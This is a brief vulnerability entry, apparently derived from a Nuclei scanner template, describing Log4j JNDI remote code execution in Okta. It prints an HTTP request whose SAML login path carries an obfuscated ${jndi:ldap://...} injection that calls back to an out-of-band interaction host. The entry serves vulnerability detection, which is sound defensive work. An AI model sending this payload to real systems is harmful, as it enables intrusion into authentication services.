# Vulnerability: Okta - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`okta-log4j-rce.yaml`)

## Description
Okta is susceptible to Log4j JNDI remote code execution. Okta provides cloud software that helps companies manage and secure user authentication into applications, and for developers to build identity controls into applications, website web services and devices.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
```

